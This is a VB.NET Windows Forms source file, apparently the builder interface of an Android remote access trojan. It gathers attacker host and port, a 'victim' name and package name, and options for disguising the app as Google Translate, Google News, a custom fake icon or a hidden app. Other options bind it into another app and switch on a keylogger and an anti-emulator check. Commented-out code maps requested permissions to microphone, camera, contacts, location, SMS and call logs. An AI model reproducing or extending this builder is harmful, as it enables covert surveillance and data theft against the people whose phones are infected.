    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs) Handles Guna2Button2.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)

            Next

        End If
    End Sub

    Private Sub Guna2NumericUpDown1_ValueChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel14_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel14.Click

    End Sub

    Private Sub TextNamePatch_TextChanged(sender As Object, e As EventArgs) Handles TextNamePatch.TextChanged

    End Sub

    Private Sub DGV0_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellContentClick

    End Sub

    Private Sub Guna2PictureBox11_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox4_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox4.Click
        Guna2Transition1.Hide(Painel1)
        Guna2Transition1.Hide(Painel3)
        Guna2Transition1.ShowSync(Painel2)
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs)
    End Sub

    Private Sub Guna2GradientPanel3_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel3.Paint

    End Sub

    Private Sub Guna2PictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox1.Click

    End Sub

    Private Sub Painel2_Paint(sender As Object, e As PaintEventArgs) Handles Painel2.Paint

    End Sub

    Private Sub Label26_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2TextBox3_TextChanged(sender As Object, e As EventArgs) Handles trgtbkg.TextChanged

    End Sub

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        Dim openFD As New OpenFileDialog

        openFD.InitialDirectory = "C:\"
        openFD.Title = "Selecte Fake App icon [Only .png] (.png)"
        openFD.Filter = "png Files|*.png"


        Select Case openFD.ShowDialog()

            Case DialogResult.OK

                FAKEAPPicon = CStr(openFD.FileName)
                fakeiconpic.Image = ResizeImage(Image.FromFile(openFD.FileName), New Size(144, 144))
            Case Else
                fakeiconpic.Image = Nothing
                FAKEAPPicon = "null"

                CheckIconPatch.Checked = False



        End Select
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs) Handles Guna2Button4.Click
        CheckBIND.Checked = True
    End Sub

    Private Sub Guna2Button5_Click(sender As Object, e As EventArgs) Handles Guna2Button5.Click
        checkkeyloger.Checked = True
    End Sub

    Private Sub Guna2PictureBox12_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox12.Click
        Guna2Transition1.Hide(Painel2)
        Guna2Transition1.Hide(Painel3)
        Guna2Transition1.ShowSync(Painel1)
    End Sub

    Private Sub Guna2GradientPanel14_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2PictureBox9_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox9.Click
        'Dim result As DialogResult = MessageBox.Show("you are the only responsible for using this program" + vbNewLine + "Only install in phone you have permissions to",
        '      "Confirm ?",
        '      MessageBoxButtons.YesNo)

        'If (result = DialogResult.Yes) Then

        'Else
        '    Return
        'End If

        'If DGV0.Rows.Count = 0 Then

        '    MsgBox("No Connection data" + vbNewLine + "Enter Host + Port First", MsgBoxStyle.Exclamation, reso.nameRAT)

        'Else

        '    If TextNameVictim.Text.Length = 0 Then

        '        MsgBox("name of victim empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '    Else

        '        If TextNamePatch.Text.Length = 0 Then

        '            MsgBox("name patch empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '        Else

        '            If TextVersion.Text.Length = 0 Then

        '                MsgBox("version empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '            Else

        '                'If TextFutex.Text.Length = 0 Then

        '                '    MsgBox("futex empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '                'Else


        '                'If TextFlavor.Text.Length = 0 Then

        '                '    MsgBox("Flavor empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '                'Else


        '                If TextPackage.Text.Length = 0 Then

        '                    MsgBox("Package Name empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '                Else

        '                    If TextPackage.Text.Length = 0 Then

        '                        MsgBox("Package Name empty", MsgBoxStyle.Exclamation, reso.nameRAT)

        '                    Else

        '                        If TextPackage.Text.Trim.StartsWith(".") Or TextPackage.Text.Trim.EndsWith(".") Then

        '                            MsgBox("Package segments must be of non-zero length", MsgBoxStyle.Exclamation, reso.nameRAT)

        '                        Else
        '                            If CheckBIND.Checked Then
        '                                If Not trgtbkg.Text.Contains(".") Then
        '                                    MsgBox("Recheck Targer Binded App Package Name")
        '                                    Return
        '                                Else
        '                                    TheTarget = trgtbkg.Text.ToLower
        '                                End If
        '                            Else
        '                                TheTarget = "null"
        '                            End If


        '                            'If CheckRecord.Checked Then
        '                            '    UseRecorder = "YES"
        '                            'End If


        '                            Select Case combotype.Text
        '                                Case "Google Translate"
        '                                    THETYPE = "T"

        '                                Case "Google News"
        '                                    'TODO MORE TYPS
        '                                    THETYPE = "N"
        '                                Case "Custom"
        '                                    THETYPE = "C"
        '                                    If FAKEAPPicon = "null" Then
        '                                        MsgBox("selecte fake icon!!!")
        '                                        Return

        '                                    End If
        '                                    FAKEAPPNAME = Textfakename.Text
        '                                    FAKEAPPlink = reso.ChekLink(Textfakelink.Text)
        '                                Case "Hidden App"
        '                                    THETYPE = "K"
        '                                    FAKEAPPNAME = "   "
        '                                    FAKEAPPlink = reso.ChekLink("www.google.com")
        '                                Case Else
        '                                    THETYPE = "T"
        '                            End Select
        '                            'If TextFlavor.Text.Trim.EndsWith(".") Then

        '                            '    MsgBox("Flavor segments must be of non-zero length", MsgBoxStyle.Exclamation, reso.nameRAT)

        '                            'Else

        '                            If combotype.Text = "Hidden App" Then
        '                                '   System.IO.File.WriteAllBytes(folder_apktool & "\" & tempApk & ".apk", My.Resources.MYSTUBTEN)
        '                                HIDETYPE = "TEN"

        '                            Else
        '                                'System.IO.File.WriteAllBytes(folder_apktool & "\" & tempApk & ".apk", My.Resources.MYSTUB)
        '                                HIDETYPE = "ONE"
        '                            End If

        '                            If checkver.Text = "V1" Then
        '                                APKVERSION = "22"
        '                            Else
        '                                If Not checkver.Text = "V2" Then
        '                                    LOG("No Ver Selected , Default : V2")
        '                                End If
        '                                APKVERSION = "28"
        '                            End If

        '                            Dim ip, ports, namevictim, namepatch, version, proprty, sleepms, futex, flavor As String

        '                            ip = Nothing

        '                            ports = Nothing

        '                            namevictim = Nothing

        '                            namepatch = Nothing

        '                            version = Nothing

        '                            proprty = Nothing

        '                            sleepms = Nothing

        '                            futex = Nothing

        '                            flavor = Nothing

        '                            For Each connection In DGV0.Rows

        '                                Dim ro As String = DirectCast(connection, Windows.Forms.DataGridViewRow).Cells(0).Value.ToString()

        '                                Dim s As String() = ro.ToString.Trim.Split({":"}, StringSplitOptions.None)

        '                                ip &= s(0) & ":"

        '                                ports &= s(1) & ":"

        '                            Next

        '                            ip = ip.Substring(0, ip.Length - 1)

        '                            ports = ports.Substring(0, ports.Length - 1)

        '                            namevictim = TextNameVictim.Text

        '                            namepatch = TextNamePatch.Text

        '                            version = TextVersion.Text

        '                            'hide app
        '                            proprty &= "1"



        '                            If CheckDoze.Checked Then

        '                                If Nottitle.Text.Length < 1 Then
        '                                    NOTIFI_TITLE = " "
        '                                Else
        '                                    NOTIFI_TITLE = Nottitle.Text
        '                                End If

        '                                If Notmsg.Text.Length < 1 Then
        '                                    NOTIFI_MSG = " "
        '                                Else
        '                                    NOTIFI_MSG = Notmsg.Text
        '                                End If

        '                                proprty &= "1"

        '                            Else

        '                                NOTIFI_TITLE = " "
        '                                NOTIFI_MSG = " "
        '                                proprty &= "0"

        '                            End If

        '                            If CheckBIND.Checked Then

        '                                proprty &= "1"

        '                            Else

        '                                proprty &= "0"

        '                            End If

        '                            'chekc admin
        '                            proprty &= "0"

        '                            'check accessbilty
        '                            proprty &= "0"

        '                            proprty &= "0"


        '                            'check all
        '                            '  If CheckAll.Checked Then
        '                            proprty &= "1"
        '                            ' Else
        '                            'If CheckNedd.Checked Then
        '                            '    proprty &= "0"
        '                            'ElseIf CheckMnul.Checked Then
        '                            '    '   Ismanul = True

        '                            '    ' If Ismanul Then
        '                            '    For Each r As DataGridViewRow In DATAP0.Rows
        '                            '        ' PRIMS = PRIMS + r.Cells(0).Value + "|"
        '                            '        Select Case r.Cells(0).Value
        '                            '            Case "Microphone"
        '                            '                PRIMS = "android.permission.RECORD_AUDIO" + "~" + PRIMS
        '                            '            Case "Camera"
        '                            '                PRIMS = "android.permission.CAMERA" + "~" + PRIMS
        '                            '            Case "CONTACTS"
        '                            '                PRIMS = "android.permission.READ_CONTACTS" + "~" + PRIMS
        '                            '            Case "Location"
        '                            '                PRIMS = "android.permission.ACCESS_FINE_LOCATION" + "~" + "android.permission.ACCESS_COARSE_LOCATION" + "~" + PRIMS
        '                            '            Case "SMS"
        '                            '                PRIMS = "android.permission.READ_SMS" + "~" + PRIMS
        '                            '            Case "Monitor Calls"
        '                            '                PRIMS = "android.permission.READ_CALL_LOG" + "~" + "android.permission.READ_PHONE_STATE" + "~" + PRIMS
        '                            '        End Select
        '                            '    Next

        '                            '    ' End If
        '                            '    proprty &= "0"
        '                            ' End If

        '                            'End If

        '                            If checkkeyloger.Checked Then
        '                                OFFKEYLOG = "on"
        '                            Else
        '                                OFFKEYLOG = Randomunicode(10, 15)
        '                            End If

        '                            If checkemo.Checked Then
        '                                ANTIEMO = "NOEMO"
        '                            Else
        '                                ANTIEMO = Randomunicode(10, 15)
        '                            End If

        '                            If CheckDoze.Checked Then

        '                                proprty &= "1"

        '                            Else

        '                                proprty &= "0"

        '                            End If

        '                            If Checksuper.Checked Then
        '                                isuper = "on"
        '                            End If


        '                            sleepms = CStr(0)

        '                            futex = ""

        '                            Dim flav As String() = TextPackage.Text.Split(".")

        '                            flavor = flav(flav.Length - 1)

        '                            '  FilePathApk.Title = "Please select a apk file"

        '                            '  FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        '                            '
        '                            '  FilePathApk.Filter = "apk Files|*.apk"

        '                            ' FilePathApk.FileName = String.Empty

        '                            '   If FilePathApk.ShowDialog() = DialogResult.OK Then


        '                            Dim i0 As Color = SpySettings.DefaultColor_Background
        '                            Dim i1 As Color = SpySettings.DefaultColor_Foreground
        '                            Dim clr As String = String.Format("{0},{1},{2}|{3},{4},{5}", i0.R, i0.G, i0.B, i1.R, i1.G, i1.B)

        '                            Dim final As String = ip & spl_arguments & ports & spl_arguments & namevictim &
        '                                                        spl_arguments & namepatch & spl_arguments & version & spl_arguments & proprty & ":" & sockets.Data.password & spl_arguments & sleepms &
        '                                                        spl_arguments & futex & spl_arguments & reso.res_Path & "\Lib\platformBinary.zip" &
        '                                                        spl_arguments & "null" & spl_arguments & reso.res_Path & "\Fonts\" &
        '                                                        spl_arguments & flavor & spl_arguments & clr & spl_arguments & iconPatch & spl_arguments & My.Settings.FontStyle & spl_arguments & My.Settings.FontSize &
        '                                                        spl_arguments & BIND_Path & spl_arguments & BIND_EX & spl_arguments & intent_ & spl_arguments & TextPackage.Text


        '                            StartWork(final)

        '                            'Dim p As String = reso.res_Path & "\Lib\build.exe"

        '                            '        If IO.File.Exists(p) Then

        '                            '            Dim proc = New ProcessStartInfo()

        '                            '            proc.FileName = p

        '                            '            proc.Arguments = final

        '                            '            proc.WindowStyle = ProcessWindowStyle.Normal

        '                            saveAll()

        '                            '            System.Diagnostics.Process.Start(proc)

        '                            '            Me.DialogResult = DialogResult.OK

        '                            '        Else

        '                            '            MsgBox("Missing:" & p, MsgBoxStyle.Exclamation, reso.nameRAT)

        '                            '        End If

        '                            '  End If

        '                            'End If

        '                        End If

        '                    End If

        '                End If

        '                ' End If

        '                ' End If

        '            End If

        '        End If

        '    End If

        'End If
        Dim result As DialogResult = MessageBox.Show("you are the only responsible for using this program" + vbNewLine + "Only install in phone you have permissions to",
                      "Confirm ?",
                      MessageBoxButtons.YesNo)

        If (result = DialogResult.Yes) Then

        Else
            Return
        End If

        If DGV0.Rows.Count = 0 Then

            MsgBox("No Connection data" + vbNewLine + "Enter Host + Port First", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

        Else

            If TextNameVictim.Text.Length = 0 Then

                MsgBox("name of victim empty", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

            Else

                If TextNamePatch.Text.Length = 0 Then

                    MsgBox("name patch empty", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

                Else

                    If TextVersion.Text.Length = 0 Then

                        MsgBox("version empty", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

                    Else

                        'If TextFutex.Text.Length = 0 Then

                        '    MsgBox("futex empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                        'Else


                        'If TextFlavor.Text.Length = 0 Then

                        '    MsgBox("Flavor empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                        'Else


                        If TextPackage.Text.Length = 0 Then

                            MsgBox("Package Name empty", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

                        Else

                            If TextPackage.Text.Length = 0 Then

                                MsgBox("Package Name empty", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

                            Else

                                If TextPackage.Text.Trim.StartsWith(".") Or TextPackage.Text.Trim.EndsWith(".") Then

                                    MsgBox("Package segments must be of non-zero length", MsgBoxStyle.Exclamation, Frm_Config_Settings.nameRAT)

                                Else
                                    If CheckBIND.Checked Then
                                        If Not trgtbkg.Text.Contains(".") Then
                                            MsgBox("Recheck Targer Binded App Package Name")
                                            Return
                                        Else
                                            TheTarget = trgtbkg.Text.ToLower
                                        End If
                                    Else
                                        TheTarget = "null"
                                    End If


                                    'If CheckRecord.Checked Then
                                    '    UseRecorder = "YES"
                                    'End If


                                    Select Case combotype.Text
                                        Case "Google Translate"
                                            THETYPE = "T"

                                        Case "Google News"
                                            'TODO MORE TYPS
                                            THETYPE = "N"
                                        Case "Custom"
                                            THETYPE = "C"
                                            If FAKEAPPicon = "null" Then
                                                MsgBox("selecte fake icon!!!")
                                                Return

                                            End If
                                            FAKEAPPNAME = Textfakename.Text
                                            FAKEAPPlink = Frm_Config_Settings.ChekLink(Textfakelink.Text)
                                        Case "Hidden App"
                                            THETYPE = "K"
                                            FAKEAPPNAME = "   "
                                            FAKEAPPlink = Frm_Config_Settings.ChekLink("www.google.com")
                                        Case Else
                                            THETYPE = "T"
                                    End Select
                                    'If TextFlavor.Text.Trim.EndsWith(".") Then

                                    '    MsgBox("Flavor segments must be of non-zero length", MsgBoxStyle.Exclamation, reso.nameRAT)

                                    'Else

                                    If combotype.Text = "Hidden App" Then
                                        '   System.IO.File.WriteAllBytes(folder_apktool & "\" & tempApk & ".apk", My.Resources.MYSTUBTEN)
                                        HIDETYPE = "TEN"

                                    Else
                                        'System.IO.File.WriteAllBytes(folder_apktool & "\" & tempApk & ".apk", My.Resources.MYSTUB)
                                        HIDETYPE = "ONE"
                                    End If

                                    If checkver.Text = "V1" Then
                                        APKVERSION = "22"
                                    Else
                                        If Not checkver.Text = "V2" Then
                                            LOG("No Ver Selected , Default : V2")
                                        End If
                                        APKVERSION = "28"
                                    End If

                                    Dim ip, ports, namevictim, namepatch, version, proprty, sleepms, futex, flavor As String

                                    ip = Nothing

                                    ports = Nothing

                                    namevictim = Nothing

                                    namepatch = Nothing

                                    version = Nothing

                                    proprty = Nothing

                                    sleepms = Nothing

                                    futex = Nothing

                                    flavor = Nothing

                                    For Each connection In DGV0.Rows

                                        Dim ro As String = DirectCast(connection, Windows.Forms.DataGridViewRow).Cells(0).Value.ToString()

                                        Dim s As String() = ro.ToString.Trim.Split({":"}, StringSplitOptions.None)

                                        ip &= s(0) & ":"

                                        ports &= s(1) & ":"

                                    Next

                                    ip = ip.Substring(0, ip.Length - 1)

                                    ports = ports.Substring(0, ports.Length - 1)

                                    namevictim = TextNameVictim.Text

                                    namepatch = TextNamePatch.Text

                                    version = TextVersion.Text

                                    'hide app
                                    proprty &= "1"



                                    If CheckDoze.Checked Then

                                        If Nottitle.Text.Length < 1 Then
                                            NOTIFI_TITLE = " "
                                        Else
                                            NOTIFI_TITLE = Nottitle.Text
                                        End If

                                        If Notmsg.Text.Length < 1 Then
                                            NOTIFI_MSG = " "
                                        Else
                                            NOTIFI_MSG = Notmsg.Text
                                        End If

                                        proprty &= "1"

                                    Else

                                        NOTIFI_TITLE = " "
                                        NOTIFI_MSG = " "
                                        proprty &= "0"

                                    End If

                                    If CheckBIND.Checked Then

                                        proprty &= "1"

                                    Else

                                        proprty &= "0"

                                    End If

                                    'chekc admin
                                    proprty &= "0"

                                    'check accessbilty
                                    proprty &= "0"

                                    proprty &= "0"


                                    'check all
                                    '  If CheckAll.Checked Then
                                    proprty &= "1"
                                    ' Else
                                    'If CheckNedd.Checked Then
                                    '    proprty &= "0"
                                    'ElseIf CheckMnul.Checked Then
                                    '    '   Ismanul = True

                                    '    ' If Ismanul Then
                                    '    For Each r As DataGridViewRow In DATAP0.Rows
                                    '        ' PRIMS = PRIMS + r.Cells(0).Value + "|"
                                    '        Select Case r.Cells(0).Value
                                    '            Case "Microphone"
                                    '                PRIMS = "android.permission.RECORD_AUDIO" + "~" + PRIMS
                                    '            Case "Camera"
                                    '                PRIMS = "android.permission.CAMERA" + "~" + PRIMS
                                    '            Case "CONTACTS"
                                    '                PRIMS = "android.permission.READ_CONTACTS" + "~" + PRIMS
                                    '            Case "Location"
                                    '                PRIMS = "android.permission.ACCESS_FINE_LOCATION" + "~" + "android.permission.ACCESS_COARSE_LOCATION" + "~" + PRIMS
                                    '            Case "SMS"
                                    '                PRIMS = "android.permission.READ_SMS" + "~" + PRIMS
                                    '            Case "Monitor Calls"
                                    '                PRIMS = "android.permission.READ_CALL_LOG" + "~" + "android.permission.READ_PHONE_STATE" + "~" + PRIMS
                                    '        End Select
                                    '    Next

                                    '    ' End If
                                    '    proprty &= "0"
                                    ' End If

                                    'End If

                                    If checkkeyloger.Checked Then
                                        OFFKEYLOG = "on"
                                    Else
                                        OFFKEYLOG = Randomunicode(10, 15)
                                    End If

                                    If checkemo.Checked Then
                                        ANTIEMO = "NOEMO"
                                    Else
                                        ANTIEMO = Randomunicode(10, 15)
                                    End If

                                    If CheckDoze.Checked Then

                                        proprty &= "1"

                                    Else

                                        proprty &= "0"

                                    End If

                                    If Checksuper.Checked Then
                                        isuper = "on"
                                    End If


                                    sleepms = CStr(0)

                                    futex = ""

                                    Dim flav As String() = TextPackage.Text.Split(".")

                                    flavor = flav(flav.Length - 1)

                                    '  FilePathApk.Title = "Please select a apk file"

                                    '  FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                                    '
                                    '  FilePathApk.Filter = "apk Files|*.apk"

                                    ' FilePathApk.FileName = String.Empty

                                    '   If FilePathApk.ShowDialog() = DialogResult.OK Then


                                    Dim i0 As Color = SpySettings.DefaultColor_Background
                                    Dim i1 As Color = SpySettings.DefaultColor_Foreground
                                    Dim clr As String = String.Format("{0},{1},{2}|{3},{4},{5}", i0.R, i0.G, i0.B, i1.R, i1.G, i1.B)

                                    Dim final As String = ip & spl_arguments & ports & spl_arguments & namevictim &
                                                                spl_arguments & namepatch & spl_arguments & version & spl_arguments & proprty & ":" & sockets.Data.password & spl_arguments & sleepms &
                                                                spl_arguments & futex & spl_arguments & Frm_Config_Settings.res_Path & "\Lib\platformBinary.zip" &
                                                                spl_arguments & "null" & spl_arguments & Frm_Config_Settings.res_Path & "\Fonts\" &
                                                                spl_arguments & flavor & spl_arguments & clr & spl_arguments & iconPatch & spl_arguments & My.Settings.FontStyle & spl_arguments & My.Settings.FontSize &
                                                                spl_arguments & BIND_Path & spl_arguments & BIND_EX & spl_arguments & intent_ & spl_arguments & TextPackage.Text


                                    StartWork(final)

                                    'Dim p As String = reso.res_Path & "\Lib\build.exe"

                                    '        If IO.File.Exists(p) Then

                                    '            Dim proc = New ProcessStartInfo()

                                    '            proc.FileName = p

                                    '            proc.Arguments = final

                                    '            proc.WindowStyle = ProcessWindowStyle.Normal

                                    saveAll()

                                    '            System.Diagnostics.Process.Start(proc)

                                    '            Me.DialogResult = DialogResult.OK

                                    '        Else

                                    '            MsgBox("Missing:" & p, MsgBoxStyle.Exclamation, reso.nameRAT)

                                    '        End If

                                    '  End If

                                    'End If

                                End If

                            End If

                        End If

                        ' End If

                        ' End If

                    End If

                End If

            End If

        End If


    End Sub

    Private Sub Painel3_Paint(sender As Object, e As PaintEventArgs) Handles Painel3.Paint

    End Sub

    Private Sub Label28_Click(sender As Object, e As EventArgs) Handles Label28.Click

    End Sub

    Private Sub Guna2GradientPanel14_Paint_1(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel14.Paint

    End Sub

    Private Sub Notmsg_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Nottitle_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CheckBox5_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox5.CheckedChanged

    End Sub

    Private Sub Guna2PictureBox10_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel33_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel33.Click

    End Sub

    Private Sub Guna2Button7_Click(sender As Object, e As EventArgs) Handles Guna2Button7.Click
        Guna2Button7.Name = "Enabled On"
        checkemo.Checked = True
    End Sub

    Private Sub Guna2Button6_Click(sender As Object, e As EventArgs) Handles Guna2Button6.Click
        Guna2Button6.Name = "Enabled On"
        Checksuper.Checked = True
    End Sub

    Private Sub Guna2Button8_Click(sender As Object, e As EventArgs) Handles Guna2Button8.Click

        Guna2Button8.Name = "Enabled On"
        CheckDoze.Checked = True
    End Sub

    Private Sub CheckDoze_Load(sender As Object, e As EventArgs) Handles CheckDoze.Load

    End Sub

    Private Sub Label13_Click(sender As Object, e As EventArgs) Handles Label13.Click

    End Sub

    Private Sub Checksuper_Load(sender As Object, e As EventArgs) Handles Checksuper.Load

    End Sub

    Private Sub Guna2ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Guna2ComboBox1.SelectedIndexChanged

    End Sub

    Private Sub Guna2PictureBox11_Click_1(sender As Object, e As EventArgs) Handles Guna2PictureBox11.Click
        Guna2Transition1.Hide(Painel1)
        Guna2Transition1.Hide(Painel2)
        Guna2Transition1.ShowSync(Painel3)
    End Sub

    Private Sub Guna2Button9_Click(sender As Object, e As EventArgs)
        CheckIconPatch.Checked = True
    End Sub

    Dim rnd As New Random
    Private Sub Panel3_Paint(sender As Object, e As PaintEventArgs) Handles Panel3.Paint
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText1.Count > 0 Then
            For Each rec In RectInputText1
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If


        Dim clr As Color = Color.FromArgb(150, SpySettings.DefaultColor_Foreground.R,
SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B)
        Dim clrPen As New Pen(clr, 1)
        Dim rect As New Rectangle(0, 0, Panel3.Width - 1, Panel3.Height - 1)
        e.Graphics.DrawRectangle(clrPen, rect)

        'ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, SpySettings.DefaultColor_Foreground, ButtonBorderStyle.Dashed)
    End Sub
    Private Sub PanelVariable_Paint(sender As Object, e As PaintEventArgs)
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText3.Count > 0 Then
            For Each rec In RectInputText3
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If
    End Sub

    Private RectInputText0 As New List(Of Rectangle)
    Private RectInputText1 As New List(Of Rectangle)
    Private RectInputText3 As New List(Of Rectangle)

    Private Sub sleep_MouseUp(sender As Object, e As MouseEventArgs)
        'startTime.Enabled = False
        'tip._ToolTip.Hide(sleep)
    End Sub
    Private Sub sleep_MouseDown(sender As Object, e As MouseEventArgs)
        startTime.Enabled = True
    End Sub
    Private Sub startTime_Tick(sender As Object, e As EventArgs) Handles startTime.Tick
        tip._ToolTip.RemoveAll()
        If Not tip._ToolTip.Active Then
            tip._ToolTip.Active = True
        End If
        'Dim po As Point = sleep.PointToClient(New Point(0, 0))
        'tip._ToolTip.Show(CStr(sleep.Tag), sleep, po)
        startTime.Enabled = False
    End Sub

    Private Sub CheckBIND_CheckedChanged(sender As Object, e As EventArgs)



    End Sub





    Private Sub CheckBIND_CheckedChanged_1(sender As Object, e As EventArgs) Handles CheckBIND.CheckedChanged
        If Programmatically Then
            GoTo skip1
        End If



        If CheckBIND.Checked Then

            FilePathApk.Title = "Select File"

            FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

            FilePathApk.Filter = "All Files|*.*"

            FilePathApk.FileName = String.Empty

            If FilePathApk.ShowDialog() = DialogResult.OK Then

                Dim p As String = FilePathApk.FileName

                If IO.File.Exists(p) Then

                    Try
                        BIND_Path = p

                        Dim f As New IO.FileInfo(BIND_Path)

                        BIND_EX = f.Extension.Remove(0, 1)

                    Catch ex As Exception

                        BIND_Path = "null"

                        BIND_EX = "null"

                        CheckBIND.Checked = False

                    End Try

                End If
            Else
                GoTo skip0
            End If

        Else
skip0:
            BIND_Path = "null"

            BIND_EX = "null"

            CheckBIND.Checked = False

        End If

skip1:
    End Sub

    Private Sub Toggle1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckIconPatch.CheckedChanged
        If Not Programmatically Then
            If CheckIconPatch.Checked = True Then
                Dim openFD As New OpenFileDialog

                openFD.InitialDirectory = "C:\"
                openFD.Title = "Selecte icon App (.png)"
                openFD.Filter = "png Files|*.png"


                Select Case openFD.ShowDialog()

                    Case DialogResult.OK

                        iconPatch = CStr(openFD.FileName)
                        Guna2PictureBox21.Image = ResizeImage(Image.FromFile(openFD.FileName), New Size(144, 144))
                    Case Else
                        Guna2PictureBox21.Image = Nothing
                        iconPatch = "null"

                        CheckIconPatch.Checked = False



                End Select
            Else
                Guna2PictureBox21.Image = Nothing
                iconPatch = "null"

                CheckIconPatch.Checked = False
            End If

        End If


    End Sub


End Class